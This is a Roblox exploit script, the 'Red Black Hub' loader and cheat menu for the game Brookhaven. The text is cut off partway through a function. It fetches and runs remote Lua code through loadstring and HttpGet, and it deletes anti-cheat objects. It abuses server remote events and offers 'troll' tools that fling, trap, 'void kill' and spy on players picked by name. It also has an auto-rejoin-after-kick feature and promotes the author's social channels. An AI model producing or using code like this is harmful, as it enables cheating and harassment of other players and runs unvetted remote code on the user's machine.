--=================================
-- RED BLACK HUB - LOADER
--=================================

local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")
local MarketplaceService = game:GetService("MarketplaceService")

local lp = Players.LocalPlayer

-- CONFIG
local LUXURY_KEY = "⟦R3D//BŁΛCK::370⟧::0x7A91-FE4C-19D8::NX/ØRBIT::V370•9F2A::©RBH"
local DISCORD_LINK = "https://discord.gg/ffuFGauPdS"
local GAMEPASS_ID = 1662810084

--=================================
-- FUNÇÃO LUXURY
--=================================

local function RunLuxuryHub()
	warn("LUXURY HUB STARTED")

	-- COLOQUE O HUB LUXURY AQUI

--========================================
-- RED BLACK HUB - LOADER CENTRALIZADO MAIOR
--========================================

-- CONFIG
local LOAD_TIME = 6
local HUB_TEXT = "RED BLACK HUB"
local LOGO_ID = "rbxassetid://91667192204008"
local LOADING_TEXTS = {"Loading...", "Loading Functions modules...", "Adding Labels..."}

-- LIMPA LOADER ANTIGO
for _, g in ipairs(pg:GetChildren()) do
    if g:IsA("ScreenGui") and g.Name:lower():find("rbh") then
        g:Destroy()
    end
end

-- BLUR
local blur = Instance.new("BlurEffect", Lighting)
blur.Size = 0
TweenService:Create(blur, TweenInfo.new(0.4), {Size = 18}):Play()

-- GUI PRINCIPAL
local gui = Instance.new("ScreenGui", pg)
gui.Name = "RBH_LOADER"
gui.DisplayOrder = 9999
gui.ResetOnSpawn = false

-- FRAME PRINCIPAL
local frame = Instance.new("Frame", gui)
frame.Size = UDim2.new(0, 700, 0, 400)
frame.Position = UDim2.new(0.5, 0, 1.2, 0)
frame.AnchorPoint = Vector2.new(0.5, 0.5)
frame.BackgroundColor3 = Color3.fromRGB(10,10,10)
frame.BorderSizePixel = 0
frame.ClipsDescendants = true
Instance.new("UICorner", frame).CornerRadius = UDim.new(0,28)

-- BORDA RGB
local stroke = Instance.new("UIStroke", frame)
stroke.Thickness = 3
task.spawn(function()
    while frame.Parent do
        stroke.Color = Color3.fromHSV((tick()*0.2)%1,1,1)
        RunService.RenderStepped:Wait()
    end
end)

-- ANIMAÇÃO DE ENTRADA
TweenService:Create(frame, TweenInfo.new(1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
    Position = UDim2.new(0.5, 0, 0.45, 0)
}):Play()

-- FUNDO HACKER
local hackerLines = {}
for i = 1, 45 do
    local txt = Instance.new("TextLabel", frame)
    txt.Size = UDim2.new(0,18,1,0)
    txt.Position = UDim2.new(0, math.random(0,680), 0, -400)
    txt.BackgroundTransparency = 1
    txt.Text = string.rep("01\n", math.random(25,45))
    txt.TextColor3 = Color3.fromRGB(255, 0, 0)
    txt.Font = Enum.Font.Code
    txt.TextSize = 14
    txt.ZIndex = 1

    table.insert(hackerLines, txt)  

    task.spawn(function()  
        while txt.Parent do  
            TweenService:Create(  
                txt,  
                TweenInfo.new(math.random(4,7), Enum.EasingStyle.Linear),  
                {Position = UDim2.new(0, txt.Position.X.Offset, 0, 400)}  
            ):Play()  
            task.wait(math.random(1,2))  
        end  
    end)
end

-- LOGO CENTRAL
local logo = Instance.new("ImageLabel", frame)
logo.Size = UDim2.new(0,120,0,120)
logo.Position = UDim2.new(0.5,0,0,30)
logo.AnchorPoint = Vector2.new(0.5,0)
logo.BackgroundTransparency = 1
logo.Image = LOGO_ID
logo.ZIndex = 5

-- TEXTO HUB
local title = Instance.new("TextLabel", frame)
title.Size = UDim2.new(1,0,0,40)
title.Position = UDim2.new(0,0,0,160)
title.BackgroundTransparency = 1
title.Text = HUB_TEXT
title.Font = Enum.Font.GothamBold
title.TextSize = 32
title.TextColor3 = Color3.new(1,1,1)
title.ZIndex = 5

-- TEXTO DE LOADING
local loadingLabel = Instance.new("TextLabel", frame)
loadingLabel.Size = UDim2.new(1,0,0,25)
loadingLabel.Position = UDim2.new(0,0,0,210)
loadingLabel.BackgroundTransparency = 1
loadingLabel.Font = Enum.Font.Gotham
loadingLabel.TextSize = 20
loadingLabel.TextColor3 = Color3.new(1,1,1)
loadingLabel.ZIndex = 5
loadingLabel.Text = LOADING_TEXTS[1]

-- BLOCOS GIRANDO NOS CANTOS
local function createRotatingBlock(pos)
    local block = Instance.new("Frame", frame)
    block.Size = UDim2.new(0,50,0,50)
    block.Position = pos
    block.AnchorPoint = Vector2.new(0.5,0.5)
    block.BackgroundColor3 = Color3.fromRGB(255,0,0)
    Instance.new("UICorner", block).CornerRadius = UDim.new(0,8)
    task.spawn(function()
        while block.Parent do
            TweenService:Create(block, TweenInfo.new(0.6), {
                Rotation = block.Rotation + 180,
                BackgroundColor3 = Color3.fromHSV(math.random(),1,1)
            }):Play()
            task.wait(0.6)
        end
    end)
    return block
end

createRotatingBlock(UDim2.new(0,50,0,50))
createRotatingBlock(UDim2.new(1,-50,0,50))

-- BARRA DE LOADER EM BLOCOS
local loaderContainer = Instance.new("Frame", frame)
loaderContainer.Size = UDim2.new(0, 600, 0, 35)
loaderContainer.Position = UDim2.new(0.5,0,0.85,0)
loaderContainer.AnchorPoint = Vector2.new(0.5,0.5)
loaderContainer.BackgroundColor3 = Color3.fromRGB(50,50,50)
loaderContainer.BorderSizePixel = 0
Instance.new("UICorner", loaderContainer).CornerRadius = UDim.new(0,10)

local numBlocks = 30
local blocks = {}
for i = 1, numBlocks do
    local b = Instance.new("Frame", loaderContainer)
    b.Size = UDim2.new(1/numBlocks, -2, 1, -2)
    b.Position = UDim2.new((i-1)/numBlocks, 1, 0, 1)
    b.BackgroundColor3 = Color3.fromRGB(255,0,0)
    b.BorderSizePixel = 0
    b.BackgroundTransparency = 1
    Instance.new("UICorner", b).CornerRadius = UDim.new(0,4)
    table.insert(blocks, b)
end

-- SOM DE ENTRADA
local s = Instance.new("Sound", SoundService)
s.SoundId = "rbxassetid://9118828569"
s.Volume = 0.6
s:Play()

-- ANIMAÇÃO DO LOADER
for i = 1, numBlocks do
    blocks[i].BackgroundTransparency = 0
    if i % 5 == 0 then
        loadingLabel.Text = LOADING_TEXTS[((i/5-1) % #LOADING_TEXTS)+1]
    end
    task.wait(LOAD_TIME/numBlocks)
end

-- FINALIZAÇÃO
for _, txt in ipairs(hackerLines) do
    TweenService:Create(txt, TweenInfo.new(1.5), {TextTransparency = 1}):Play()
end

TweenService:Create(frame, TweenInfo.new(1.8, Enum.EasingStyle.Quad), {Size = UDim2.new(0,0,0,0)}):Play()
TweenService:Create(blur, TweenInfo.new(1.8), {Size = 0}):Play()
task.wait(1.9)
gui:Destroy()
blur:Destroy()

print("RED BLACK HUB LOADER FINISHED")

-- =========================================================
-- BAN / VERIFICAÇÃO
-- =========================================================
local banidos = {
    ["NHHSIHHSGHHSAHHS"] = true,
}

local bannedStrings = {
    "itz",  
    "ax7",
}

local function isExactNameBanned(player)
    return banidos[player.Name] == true
end

local function isNameContainingBannedWord(player)
    local name = string.lower(player.Name)  
    local display = string.lower(player.DisplayName)  
    for _, word in ipairs(bannedStrings) do  
        if string.find(name, word) or string.find(display, word) then  
            return true  
        end  
    end  
    return false
end

local function verificarBan(player)
    local ok, res = pcall(function()  
        if isExactNameBanned(player) or isNameContainingBannedWord(player) then  
            player:Kick("Proibido no Red Black Hub.")  
            return true  
        end  
        return false  
    end)  
    if not ok then  
        warn("Erro verificando ban:", res)  
        return false  
    end  
    return res
end

local LocalPlayer = Players.LocalPlayer
if LocalPlayer then
    verificarBan(LocalPlayer)
end

-- =========================================================
-- RP NAME + BIO (BROOKHAVEN FIX)
-- =========================================================
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RE = ReplicatedStorage:WaitForChild("RE")
local RPRemote = RE:WaitForChild("1RPNam1eTex1t")
local ColorRemote = RE:WaitForChild("1RPNam1eColo1r")

-- RP NAME
RPRemote:FireServer("RolePlayName", "{RED BLACK HUB | BROOKHAVEN}")

-- RP NAME COLOR (RED)
ColorRemote:FireServer("PickingRPNameColor", Color3.fromRGB(255, 0, 0))

-- RP BIO TEXT
local bioText
if lp.Name:lower() == "scarys_cary66666" then
    bioText = "OWNER OF RED BLACK HUB"
else
    bioText = "Hello " .. lp.DisplayName
end

RPRemote:FireServer("RolePlayBio", bioText)

-- RP BIO COLOR (BLACK)
ColorRemote:FireServer("PickingRPBioColor", Color3.fromRGB(0, 0, 0))

-- =========================================================
-- AUDIO LOGIC (SISTEMA DE SEQUÊNCIA DE AUDIO)
-- =========================================================
local sons = {
    "rbxassetid://94509403808673",  
    "rbxassetid://130219836212781",  
    "rbxassetid://78430692054916",  
    "rbxassetid://154345248",  
    "rbxassetid://87484814057059",  
    "rbxassetid://113491014204126",  
    "rbxassetid://110983956928751",  
    "rbxassetid://80344181334677",  
    "rbxassetid://97529429187942",  
    "rbxassetid://5858548244",  
    "rbxassetid://15929797051",  
    "rbxassetid://113118633294800",  
    "rbxassetid://113028772835303",  
    "rbxassetid://102566984907215",  
    "rbxassetid://100835951102315",  
    "rbxassetid://4810729995",  
    "rbxassetid://78430692054916"
}

_G.somIndex = _G.somIndex or 0

local function PlayNextSound()
    _G.somIndex = _G.somIndex + 1
    if _G.somIndex > #sons then
        _G.somIndex = 1
    end
    
    local tiro = Instance.new("Sound")
    tiro.SoundId = sons[_G.somIndex]
    tiro.Volume = 1
    tiro.Parent = SoundService
    tiro:Play()
    
    task.delay(5, function()
        tiro:Destroy()
    end)
end

-- =========================================================
-- SPLASH SEQUENCIAL COM FADE E DESFOQUE
-- =========================================================
local CoreGui = game:GetService("CoreGui")  
local ContentProvider = game:GetService("ContentProvider")  

local function runSplashSequence()  
    local totalTime = 4
    local half = totalTime / 2  

    local old = CoreGui:FindFirstChild("RBH_Splash")  
    if old then old:Destroy() end  

    -- Ativa desfoque no Lighting durante os Splashes
    local splashBlur = Instance.new("BlurEffect", Lighting)
    splashBlur.Size = 20

    local guiSplash = Instance.new("ScreenGui")  
    guiSplash.Name = "RBH_Splash"  
    guiSplash.IgnoreGuiInset = true  
    guiSplash.ResetOnSpawn = false  
    guiSplash.ZIndexBehavior = Enum.ZIndexBehavior.Sibling  
    guiSplash.Parent = CoreGui  

    local img = Instance.new("ImageLabel")  
    img.Name = "Splash"  
    img.BackgroundTransparency = 1  
    img.AnchorPoint = Vector2.new(0.5, 0.5)  
    img.Position = UDim2.fromScale(0.5, 0.5)  
    img.Size = UDim2.fromScale(0.35, 0.35)  
    img.ImageTransparency = 1  
    img.Parent = guiSplash  

    local corner = Instance.new("UICorner")  
    corner.CornerRadius = UDim.new(0, 16)  
    corner.Parent = img  

    -- TAbela com a ordem das imagens que vão rodar sequencialmente
    local imageSequence = {
        "116836698110493",
        "91667192204008"
    }

    -- Roda uma imagem de cada vez
    for _, assetId in ipairs(imageSequence) do
        img.Image = "rbxassetid://" .. tostring(assetId)
        
        pcall(function()  
            ContentProvider:PreloadAsync({ img.Image })  
        end)  

        -- Toca o som respectivo da iteração atual
        PlayNextSound()

        local fadeIn = TweenService:Create(  
            img,  
            TweenInfo.new(half, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),  
            { ImageTransparency = 0 }  
        )  
        local fadeOut = TweenService:Create(  
            img,  
            TweenInfo.new(half, Enum.EasingStyle.Quad, Enum.EasingDirection.In),  
            { ImageTransparency = 1 }  
        )  

        fadeIn:Play()
        fadeIn.Completed:Wait()  
        
        task.wait(0.2) -- Pequena pausa estável com a imagem visível antes de sumir
        
        fadeOut:Play()
        fadeOut.Completed:Wait()  
        
        task.wait(0.1) -- Intervalo rápido entre uma troca de imagem e outra
    end

    -- Limpa toda a estrutura e desliga o desfoque gradualmente
    guiSplash:Destroy()  
    TweenService:Create(splashBlur, TweenInfo.new(0.4), {Size = 0}):Play()
    task.delay(0.4, function() splashBlur:Destroy() end)
end  

-- Executa toda a sequência de splash travando o script aqui até terminar
runSplashSequence()

-- =========================================================
-- EXECUÇÃO DO HUB (SÓ COMEÇA APÓS TERMINAR OS SPLASHES)
-- =========================================================
local redzlib = loadstring(game:HttpGet("https://raw.githubusercontent.com/THEMRREDBLACK/LibraryRobloc/refs/heads/main/RedzLibrary.lua"))()

local Window = redzlib:MakeWindow({
  Title = "RED BLACK HUB-BROOKHAVEN",
  SubTitle = "HUB VERSION:3.066:PRO",
  SaveFolder = "RedBlackHub_Brookhaven.json"
})

Window:AddMinimizeButton({
    Button = {
        Image = "rbxassetid://116836698110493",
        BackgroundTransparency = 1,
        Size = UDim2.new(0, 70, 0, 70) -- tamanho maior
    },

    Corner = {
        CornerRadius = UDim.new(30000, 10000)
    }
})

-- ==========================================
-- TAB INFO
-- ==========================================
local TabInfo = Window:MakeTab({"TAB INFO", "info"})

TabInfo:AddParagraph({"HUB DEVS:", "HUB VERSION:367:PRO"})

TabInfo:AddDiscordInvite({
    Name = "RED BLACK COMMUNITY",
    Description = "Join our official Discord server!",
    Logo = "rbxassetid://91667192204008",
    Invite = "https://discord.gg/9yYA4gHrPJ",
})

TabInfo:AddButton({"COPY YOUTUBE", function()
    setclipboard("https://m.youtube.com/@THE_MR_RED_BLACK_SCRIPTS_OWNER")
end})

TabInfo:AddButton({"COPY TIKTOK", function()
    setclipboard("https://www.tiktok.com/@the_mr_red_black_owner?_r=1&_t=ZS-92VA3VA1kST")
end})

TabInfo:AddParagraph({"HUB DEVS:", "The Mr Red Black Scripts Owner\nPedro of war\nThe Clock Work Dev"})

TabInfo:AddParagraph({"IDEAS:", "The Mr Red Black Scripts Owner\nKALEBAO\nThe Mr Dog\nBolota\nSlow\nAbacate\nGabriel\nrinkzada\nStreex\nThe Clock Work Dev\nStell Win\nEggman"})

TabInfo:AddParagraph({"HUB TESTERS:", "The Mr Red Black Scripts Owner\nKALEBAO\nThe Mr Dog\nKystrypkry\nBolota\nLeopys\nSlow\nCarlinhos Cavalos\nBlack\nmimiwhat\nSkynZ\nStarFarer\nShadow\nRyan\nRed Black\nStreex\nThe Clock Work Dev\nStell Win\nEggman"})

TabInfo:AddParagraph({"WARNING", "If you get banned using the Red Black hub, send a screenshot to the Red Black Community.\nWe are 30% responsible for your ban.\nIn other words, we're going to try to unban you from the game."})

TabInfo:AddParagraph({"HELP US", "Also, if you're a developer too, feel free to help me with the scripts if you'd like."})

-- ==========================================
-- TAB MAIN
-- ==========================================
local Tab5 = Window:MakeTab({"MAIN", "home"})

local Players = game:GetService("Players")
local TeleportService = game:GetService("TeleportService")
local GuiService = game:GetService("GuiService")
local LocalPlayer = Players.LocalPlayer
local LP = Players.LocalPlayer

-- AUTO REJOIN ON KICK
local AutoRejoinEnabled = false
local KickConnection

Tab5:AddToggle({
    Name = "AUTO REJOIN ON KICK",
    Default = false,
    Callback = function(state)
        AutoRejoinEnabled = state

        if KickConnection then
            KickConnection:Disconnect()
            KickConnection = nil
        end

        if state then
            KickConnection = GuiService.ErrorMessageChanged:Connect(function(msg)
                if AutoRejoinEnabled and msg and msg ~= "" then
                    task.wait(1)
                    TeleportService:TeleportToPlaceInstance(
                        game.PlaceId,
                        game.JobId,
                        LocalPlayer
                    )
                end
            end)
        end
    end
})

-- COPY SERVER ID
Tab5:AddButton({"COPY SERVER ID", function()
    if setclipboard then
        setclipboard(game.JobId)
    end
end})

-- ANTI CHEAT BYPASS
Tab5:AddButton({"ANTI CHEAT BYPASS", function()
    for _,obj in ipairs(game:GetDescendants()) do
        if obj.Name then
            local n = string.lower(obj.Name)
            if n == "anticheat" or n == "exploit" then
                pcall(function()
                    obj:Destroy()
                end)
            end
        end
    end
end})

-- REJOIN
Tab5:AddButton({"REJOIN", function()
    game:GetService("TeleportService"):Teleport(game.PlaceId, game.Players.LocalPlayer)
end})

-- JOIN/EXIT NOTIFICATION
local monitorConnections = {}

local function GetPlayerThumbnail(userId)
    local thumbType = Enum.ThumbnailType.HeadShot
    local thumbSize = Enum.ThumbnailSize.Size100x100
    local content, isReady = Players:GetUserThumbnailAsync(userId, thumbType, thumbSize)
    return content
end

local function Notify(playerName, joined)
    local text = joined and ("PLAYER %s JOINED"):format(playerName) or ("PLAYER %s LEFT"):format(playerName)
    local player = Players:FindFirstChild(playerName)
    local icon = nil
    if player then
        icon = GetPlayerThumbnail(player.UserId)
    end
    game.StarterGui:SetCore("SendNotification", {
        Title = "RED BLACK HUB",
        Text = text,
        Icon = icon or "",
        Duration = 5
    })
end

Tab5:AddToggle({
    Name = "JOIN/EXIT NOTIFICATION",
    Default = false,
    Callback = function(state)
        for _, conn in pairs(monitorConnections) do
            conn:Disconnect()
        end
        monitorConnections = {}

        if state then
            table.insert(monitorConnections, Players.PlayerAdded:Connect(function(p)
                Notify(p.Name, true)
            end))

            table.insert(monitorConnections, Players.PlayerRemoving:Connect(function(p)
                Notify(p.Name, false)
            end))
        end
    end
})

-- COPY COORDINATES
Tab5:AddButton({"COPY COORDINATES", function()
    local player = game.Players.LocalPlayer
    if player and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
        local pos = player.Character.HumanoidRootPart.Position
        setclipboard(string.format("X: %d, Y: %d, Z: %d", pos.X, pos.Y, pos.Z))
        print("Coordenadas copiadas para a area de transferencia: ", pos)
    else
        print("Nao foi possivel obter as coordenadas.")
    end
end})

-- GOTO SAFE ZONE
Tab5:AddButton({"GOTO SAFE ZONE", function()
    local char = LP.Character
    local hrp = char and char:FindFirstChild("HumanoidRootPart")
    if not hrp then return end

    hrp.CFrame = CFrame.new(1080, 76, -1070)
end})

-- SET SPAWNPOINT
local spawnCFrame = nil

Tab5:AddButton({"SET SPAWNPOINT", function()
    local player = game.Players.LocalPlayer
    if player and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
        spawnCFrame = player.Character.HumanoidRootPart.CFrame
        print("Ponto de spawn definido!")
        
        game.StarterGui:SetCore("SendNotification", {
            Title = "SpawnPoint",
            Text = "Seu ponto de spawn foi salvo!",
            Duration = 5
        })
    else
        print("Nao foi possivel definir o ponto de spawn.")
    end
end})

game.Players.LocalPlayer.CharacterAdded:Connect(function(char)
    if spawnCFrame then
        local hrp = char:WaitForChild("HumanoidRootPart", 10)
        if hrp then
            hrp.CFrame = spawnCFrame
            print("Teleportado para o ponto de spawn salvo!")
        end
    end
end)

-- ANTI AFK
local function antiAFK()
    local player = game.Players.LocalPlayer
    local character = player.Character or player.CharacterAdded:Wait()
    local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
    
    local function moverJogador()
        humanoidRootPart.CFrame = humanoidRootPart.CFrame * CFrame.new(0, 0, 0.1)
        task.wait(1)
        humanoidRootPart.CFrame = humanoidRootPart.CFrame * CFrame.new(0, 0, -0.1)
    end

    while true do
        task.wait(600)
        moverJogador()
    end
end

Tab5:AddButton({"ANTI AFK", function()
    task.spawn(antiAFK)
end})

Window:SelectTab(TabInfo)

-- ==========================================
-- TAB TROLL
-- ==========================================
do
    local TabTroll = Window:MakeTab({"TROLL", "skull"})

    local Players = game:GetService("Players")
    local LP = Players.LocalPlayer
    local RunService = game:GetService("RunService")
    local Camera = workspace.CurrentCamera
    local ReplicatedStorage = game:GetService("ReplicatedStorage")

    local selectedPlayerName = ""
    local selectedFlingType = "FLING"
    local orbitRadius = 6
    local orbitSpeed = 0.05
    local DISTANCE = 2

    local activeConnections = {}

    local function FindTarget(name)
        if not name or name == "" then return nil end
        name = name:lower()
        for _, plr in ipairs(Players:GetPlayers()) do
            if plr ~= LP and (plr.Name:lower():find(name) or plr.DisplayName:lower():find(name)) then
                return plr
            end
        end
        return nil
    end

    local function GetDynamicOffset(thrp)
        local isMoving = thrp.AssemblyLinearVelocity.Magnitude > 2
        return isMoving and 20 or 3
    end

    local function ClearConnection(key)
        if activeConnections[key] then
            if type(activeConnections[key]) == "thread" then
                task.cancel(activeConnections[key])
            elseif typeof(activeConnections[key]) == "RBXScriptConnection" then
                activeConnections[key]:Disconnect()
            end
            activeConnections[key] = nil
        end
        if LP.Character then
            local hrp = LP.Character:FindFirstChild("HumanoidRootPart")
            if hrp then
                hrp.AssemblyLinearVelocity = Vector3.zero
                hrp.AssemblyAngularVelocity = Vector3.zero
            end
        end
    end

    local function SpawnAndSitBoat()
        local hrp = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
        if not hrp then return nil end

        hrp.CFrame = CFrame.new(1620, -3, -318)
        task.wait(0.2)

        local re = ReplicatedStorage:FindFirstChild("RE")
        if re and re:FindFirstChild("1Ca1r") then
            local args = {
                [1] = "PickingBoat",
                [2] = "PirateFree",
                [3] = "Boat"
            }
            re["1Ca1r"]:FireServer(unpack(args))
        end

        task.wait(0.4)
        hrp.CFrame = CFrame.new(1647, 16, -327)
        task.wait(0.3)

        return workspace:FindFirstChild(LP.Name .. "Car")
    end

    TabTroll:AddTextBox({
        Name = "PLAYER NAME",
        Description = "Enter target player name",
        PlaceholderText = "Username or Display...",
        Callback = function(text)
            selectedPlayerName = text
        end
    })

    TabTroll:AddButton({"GET COUCH", function()
        local RS = ReplicatedStorage
        if RS:FindFirstChild("RE") and RS.RE:FindFirstChild("1Too1l") then
            RS.RE["1Too1l"]:InvokeServer("PickingTools", "Couch")
            task.wait(0.2)

            local backpack = LP:FindFirstChild("Backpack")
            local character = LP.Character
            if backpack and character then
                local couch = backpack:FindFirstChild("Couch")
                if couch then
                    character:FindFirstChildOfClass("Humanoid"):EquipTool(couch)
                end
            end
        end
    end})

    TabTroll:AddSection({"Basic Functions"})

    TabTroll:AddButton({"GO TO PLAYER", function()
        local target = FindTarget(selectedPlayerName)
        if target and target.Character and target.Character:FindFirstChild("HumanoidRootPart") then
            LP.Character.HumanoidRootPart.CFrame = target.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, DISTANCE)
        end
    end})

    TabTroll:AddToggle({
        Name = "STICK PLAYER",
        Default = false,
        Callback = function(state)
            ClearConnection("STICK PLAYER")
            if state then
                activeConnections["STICK PLAYER"] = RunService.Heartbeat:Connect(function()
                    local target = FindTarget(selectedPlayerName)
                    if target and target.Character and target.Character:FindFirstChild("HumanoidRootPart") then
                        LP.Character.HumanoidRootPart.CFrame = target.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, DISTANCE)
                    end
                end)
            end
        end
    })

    TabTroll:AddToggle({
        Name = "VIEW",
        Default = false,
        Callback = function(state)
            ClearConnection("VIEW")
            if state then
                activeConnections["VIEW"] = RunService.Heartbeat:Connect(function()
                    local target = FindTarget(selectedPlayerName)
                    if target and target.Character then
                        Camera.CameraSubject = target.Character:FindFirstChildOfClass("Humanoid")
                    end
                end)
            else
                if LP.Character then
                    Camera.CameraSubject = LP.Character:FindFirstChildOfClass("Humanoid")
                end
            end
        end
    })

    TabTroll:AddToggle({
        Name = "ORBITING PLAYER",
        Default = false,
        Callback = function(state)
            ClearConnection("ORBITING")
            if state then
                local angle = 0
                activeConnections["ORBITING"] = RunService.Heartbeat:Connect(function()
                    local target = FindTarget(selectedPlayerName)
                    if target and target.Character and target.Character:FindFirstChild("HumanoidRootPart") then
                        angle = angle + orbitSpeed
                        local x, z = math.cos(angle) * orbitRadius, math.sin(angle) * orbitRadius
                        LP.Character.HumanoidRootPart.CFrame = CFrame.new(target.Character.HumanoidRootPart.Position + Vector3.new(x, 2, z), target.Character.HumanoidRootPart.Position)
                    end
                end)
            end
        end
    })

    TabTroll:AddDropdown({
        Name = "FLING METHOD",
        Description = "Select Fling Velocity Mode",
        Options = {"FLING", "TELEPORT+FLING"},
        Default = "FLING",
        Callback = function(val)
            selectedFlingType = val
        end
    })

    TabTroll:AddSection({"Heavy Trolls"})

    TabTroll:AddToggle({
        Name = "FLING COUCH",
        Default = false,
        Callback = function(state)
            ClearConnection("FLING COUCH")
            if state then
                local rotX, rotY, rotZ = 0, 0, 0

                activeConnections["FLING COUCH"] = RunService.Heartbeat:Connect(function()
                    local target = FindTarget(selectedPlayerName)
                    if not target or not target.Character or not target.Character:FindFirstChild("HumanoidRootPart") then return end

                    local hrp = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
                    local thrp = target.Character.HumanoidRootPart
                    local hum = target.Character:FindFirstChildOfClass("Humanoid")

                    if not hrp then return end

                    if hum and hum.Sit then
                        if selectedFlingType == "FLING" then
                            hrp.AssemblyLinearVelocity = Vector3.new(0, 999999999, 0)
                            hrp.CFrame = CFrame.new(0, 999999, 0)
                        else
                            hrp.CFrame = CFrame.new(0, 1e18, 0)
                        end
                        ClearConnection("FLING COUCH")
                        return
                    end

                    hrp.AssemblyLinearVelocity = Vector3.new(40000, 40000, 40000)
                    hrp.AssemblyAngularVelocity = Vector3.new(40000, 40000, 40000)

                    rotX = rotX + 90
                    rotY = rotY + 120
                    rotZ = rotZ + 90

                    hrp.CFrame = thrp.CFrame * CFrame.Angles(math.rad(rotX), math.rad(rotY), math.rad(rotZ))
                end)
            end
        end
    })

    TabTroll:AddToggle({
        Name = "BRING PLAYER",
        Default = false,
        Callback = function(state)
            ClearConnection("BRING PLAYER")
            if state then
                local angle1, angle2 = 0, 0
                local lastPos = LP.Character and LP.Character.HumanoidRootPart.CFrame
                activeConnections["BRING PLAYER"] = RunService.Heartbeat:Connect(function()
                    local target = FindTarget(selectedPlayerName)
                    if not target or not target.Character or not target.Character:FindFirstChild("HumanoidRootPart") then return end

                    local hrp = LP.Character.HumanoidRootPart
                    local thrp = target.Character.HumanoidRootPart
                    local hum = target.Character:FindFirstChildOfClass("Humanoid")

                    if hum and hum.Sit then
                        if lastPos then hrp.CFrame = lastPos end
                        ClearConnection("BRING PLAYER")
                        return
                    end

                    local dist = GetDynamicOffset(thrp)

                    angle1 = angle1 + 1.2
                    angle2 = angle2 + 1.8
                    local x, y, z = math.cos(angle1) * dist, math.sin(angle2) * dist, math.sin(angle1) * dist
                    hrp.AssemblyLinearVelocity = Vector3.new(0, 60, 0)
                    hrp.CFrame = CFrame.new(thrp.Position + Vector3.new(x, y, z)) * CFrame.Angles(angle1, angle2, angle1)
                end)
            end
        end
    })

    TabTroll:AddToggle({
        Name = "PRISON PLAYER",
        Default = false,
        Callback = function(state)
            ClearConnection("PRISON PLAYER")
            if state then
                local angle1, angle2 = 0, 0
                activeConnections["PRISON PLAYER"] = RunService.Heartbeat:Connect(function()
                    local target = FindTarget(selectedPlayerName)
                    if not target or not target.Character or not target.Character:FindFirstChild("HumanoidRootPart") then return end

                    local hrp = LP.Character.HumanoidRootPart
                    local thrp = target.Character.HumanoidRootPart
                    local hum = target.Character:FindFirstChildOfClass("Humanoid")

                    if hum and hum.Sit then
                        hrp.CFrame = CFrame.new(55, 34, 631)
                        ClearConnection("PRISON PLAYER")
                        return
                    end

                    local dist = GetDynamicOffset(thrp)

                    angle1 = angle1 + 1.2
                    angle2 = angle2 + 1.8
                    local x, y, z = math.cos(angle1) * dist, math.sin(angle2) * dist, math.sin(angle1) * dist
                    hrp.AssemblyLinearVelocity = Vector3.new(0, 60, 0)
                    hrp.CFrame = CFrame.new(thrp.Position + Vector3.new(x, y, z)) * CFrame.Angles(angle1, angle2, angle1)
                end)
            end
        end
    })

    TabTroll:AddToggle({
        Name = "VOID KILL PLAYER",
        Default = false,
        Callback = function(state)
            ClearConnection("VOID KILL PLAYER")
            if state then
                local angle1, angle2 = 0, 0
                activeConnections["VOID KILL PLAYER"] = RunService.Heartbeat:Connect(function()
                    local target = FindTarget(selectedPlayerName)
                    if not target or not target.Character or not target.Character:FindFirstChild("HumanoidRootPart") then return end

                    local hrp = LP.Character.HumanoidRootPart
                    local thrp = target.Character.HumanoidRootPart
                    local hum = target.Character:FindFirstChildOfClass("Humanoid")

                    if hum and hum.Sit then
                        hrp.CFrame = CFrame.new(0, -900, 0)
                        ClearConnection("VOID KILL PLAYER")
                        return
                    end

                    local dist = GetDynamicOffset(thrp)

                    angle1 = angle1 + 1.2
                    angle2 = angle2 + 1.8
                    local x, y, z = math.cos(angle1) * dist, math.sin(angle2) * dist, math.sin(angle1) * dist
                    hrp.AssemblyLinearVelocity = Vector3.new(0, 60, 0)
                    hrp.CFrame = CFrame.new(thrp.Position + Vector3.new(x, y, z)) * CFrame.Angles(angle1, angle2, angle1)
                end)
            end
        end
    })

    TabTroll:AddToggle({
        Name = "FLING BOAT",
        Default = false,
        Callback = function(state)
            ClearConnection("FLING BOAT")
            ClearConnection("FLING BOAT_CONN")

            if state then
                activeConnections["FLING BOAT"] = task.spawn(function()
                    local boat = SpawnAndSitBoat()
                    local angleOrbit = 0
                    local rotX, rotY, rotZ = 0, 0, 0

                    local conn
                    conn = RunService.Heartbeat:Connect(function()
                        local target = FindTarget(selectedPlayerName)
                        if not target or not target.Character or not target.Character:FindFirstChild("HumanoidRootPart") then return end

                        local hrp = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
                        local lhum = LP.Character and LP.Character:FindFirstChildOfClass("Humanoid")
                        local thrp = target.Character.HumanoidRootPart

                        if not hrp or not lhum then return end

                        if not lhum.Sit then
                            ClearConnection("FLING BOAT")
                            ClearConnection("FLING BOAT_CONN")
                            return
                        end

                        angleOrbit = angleOrbit + 0.35
                        rotX = rotX + 40
                        rotY = rotY + 55
                        rotZ = rotZ + 25

                        local offsetX = math.cos(angleOrbit) * 30
                        local offsetZ = math.sin(angleOrbit) * 30
                        local targetPos = thrp.Position + Vector3.new(offsetX, 15, offsetZ)

                        local targetPart = (boat and (boat.PrimaryPart or boat:FindFirstChild("Body") or boat:FindFirstChildOfClass("BasePart"))) or hrp

                        targetPart.AssemblyLinearVelocity = Vector3.new(50000, 50000, 50000)
                        targetPart.AssemblyAngularVelocity = Vector3.new(50000, 50000, 50000)
                        targetPart.CFrame = CFrame.new(targetPos) 
                            * CFrame.Angles(math.rad(rotX), math.rad(rotY), math.rad(rotZ))
                    end)

                    activeConnections["FLING BOAT_CONN"] = conn
                end)
            else
                if LP.Character then
                    local lhum = LP.Character:FindFirstChildOfClass("Humanoid")
                    local hrp = LP.Character:FindFirstChild("HumanoidRootPart")
                    if lhum then lhum.Sit = false end
                    if hrp then
